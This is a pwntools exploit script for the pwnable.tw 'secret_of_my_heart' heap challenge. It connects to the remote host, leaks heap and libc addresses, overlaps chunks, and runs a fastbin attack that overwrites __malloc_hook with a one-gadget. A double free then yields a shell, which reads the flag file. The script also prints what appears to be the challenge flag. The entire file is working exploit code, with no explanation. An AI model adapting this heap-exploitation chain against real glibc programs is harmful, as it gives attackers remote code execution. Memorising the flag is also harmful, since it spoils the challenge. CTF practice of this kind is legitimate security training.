from pwn import *
def cmd(c):
	p.sendlineafter("choice :",str(c))
def add(size,c="n132",name="A"*0x20):
	cmd(1)
	p.sendlineafter("Size of heart : ",str(size))
	p.sendafter("Name of heart :",name)
	p.sendafter("my heart :",c)
def free(idx):
	cmd(3)
	p.sendlineafter("Index :",str(idx))
def show(idx):
	cmd(2)
	p.sendlineafter("Index :",str(idx))
#p=process("secret_of_my_heart",env={"LD_PRELOAD":"./libc_64.so.6"})
#context.log_level='debug'
p=remote("chall.pwnable.tw",10302)
add(0x100,"0")
show(0)
p.readuntil("A"*0x20)
heap=u64(p.readline()[:-1].ljust(8,"\x00"))-(0x555555757010-0x0000555555757000)
add(0x100,"1")
add(0x88,"2")
add(0x18,'3')
free(0)
free(1)
add(0x38,"0"*0x38)
add(0x88,"1")
add(0x68,"4")
free(1)
free(2)
# over lap
add(0x88)#1
show(4)
p.readuntil("Secret : ")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7fbba86b2b78-0x00007fbba82ef000)
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
log.warning(hex(heap))
log.warning(hex(base))
libc=ELF("./libc_64.so.6")
libc.address=base

add(0x68,p64(0xcafebabe))#2
add(0x68,p64(0xdeadbeef))#5
free(2)
free(5)
free(4)
#context.log_level='debug'
#gdb.attach(p)
add(0x68,p64(libc.symbols['__malloc_hook']-35))#2
add(0x68,p64(0xdeadbeef))#4
add(0x68,p64(0xdeadbeef))#5
add(0x68,"\x00"*19+p64(base+0xef6c4))#6
free(2)
free(5)

p.sendline("cat /home/secret_of_my_heart/flag")
p.interactive("FLAG{It_just_4_s3cr3t_on_the_h34p}")
